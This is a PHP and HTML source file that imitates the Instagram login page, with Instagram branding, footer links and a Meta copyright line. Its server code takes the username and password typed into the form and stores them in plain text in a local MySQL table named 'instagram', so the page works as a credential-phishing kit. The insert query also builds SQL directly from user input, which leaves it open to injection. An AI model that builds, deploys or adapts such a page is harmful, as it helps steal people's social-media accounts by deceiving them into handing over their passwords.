<?php
$serverName = "localhost";
$username = "root";
$password = "";
$database = "instagramInfo";

$conn = mysqli_connect($serverName, $username, $password, $database);

//Check connection
if (!$conn) {
    die('<script>console.log ("Not connect to database because of --->' . mysqli_connect_error() . '")</script>');
} else {
    echo '<script>console.log("Connection was successfully!!")</script>';
}
//Upload into database
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $user_id = $_POST['user_id'];
    $user_password = $_POST['password'];

    $sql = "INSERT INTO `instagram`(`user`,`password`) VALUE('$user_id','$user_password')";

    $result = mysqli_query($conn, $sql);
    if ($result) {
        echo "<script>console.log('Your entry has been submitted successfully');</script>";
        echo "<br>";
    } else {
        echo  "<script>console.log('Error! There is some technical issus and you entry was not submitted Successfully.');</script>";
        echo "<br>";
    }
}

?>
<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login &bull; Instagram</title>
        <link rel="icon" sizes="192x192" href="./logo.png">
        <link rel="stylesheet" href="InstaFace.css">
    </head>

    <body>
        <main>
            <section>
                <div class="main">
                    <form action="./InstaFace.php" method="post">
                        <div class="name">
                            <div class="heading"></div>
                        </div>
                        <div class="input_container">
                            <input class="inputs" type="text" name="user_id" id="user_name"
                                placeholder="Phone number,username,or email" required>
                        </div>
                        <div class="input_container">
                            <input class="inputs" type="password" placeholder="Password" name="password" required>
                        </div>
                        <div class="Submit-btn">
                            <button href="instagram: //user?username=username" type="submit" value="Submit">Log in
                            </button>
                        </div>
                        <div class="divide">
                            <div class="line"></div>
                            <div class="text_or">OR</div>
                            <div class="line"></div>
                        </div>
                        <div class="fb-log">
                            <div><a href="#">
                                    <div class="fb"></div>
                                    <div class="fb-sign">Log in with Facebook</div>
                                </a></div>
                            <p><a href="#">Forgot password?</a></p>
                        </div>
                    </form>
                </div>
                <div class="nonAcc">
                    <span>Don't have an account?<a href="#">Sign up</a></span>
                </div>
                <div class="app">
                    <div>
                        <p>Get the app.</p>
                    </div>
                    <div class="app-img">
                        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&pli=1"><img
                                src="./play.png" alt="Play Store">
                        </a>
                        <a id="ms-str"
                            href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=951%2C0%2C977%2C548"><img
                                src="./ms.png" alt="Microsoft Store">
                        </a>
                    </div>
                </div>
                <div class="foot-container">
                    <a href="">
                        <div class="more_item">Meta</div>
                    </a>
                    <a href="">
                        <div class="more_item">About</div>
                    </a>
                    <a href="">
                        <div class="more_item">Blog</div>
                    </a>
                    <a href="">
                        <div class="more_item">Jobs</div>
                    </a>
                    <a href="">
                        <div class="more_item">Help</div>
                    </a>
                    <a href="">
                        <div class="more_item">API</div>
                    </a>
                    <a href="">
                        <div class="more_item">Privacy</div>
                    </a>
                    <a href="">
                        <div class="more_item">Term</div>
                    </a>
                    <a href="">
                        <div class="more_item">Top Account</div>
                    </a>
                    <a href="">
                        <div class="more_item">Location</div>
                    </a>
                    <a href="">
                        <div class="more_item">Instagram Lite</div>
                    </a>
                    <a href="">
                        <div class="more_item">Contact Uploading & Non-Users</div>
                    </a>
                    <a href="">
                        <div class="more_item">Meta Verified</div>
                    </a>
                </div>
            </section>
            <div class="copy-lan">
                <select id="language">
                    <option value="English" class="options">English</option>
                    <option value="hindi" class="options">Hindi</option>
                    <option value="oriya" class="options">oriya</option>
                    <option value="tamil" class="options">tamil</option>
                    <option value="spanish" class="options">spanish</option>
                    <option value="urdu" class="options">urdu</option>
                </select>&copy;2023 Instagram from Meta
            </div>
        </main>
    </body>

</html>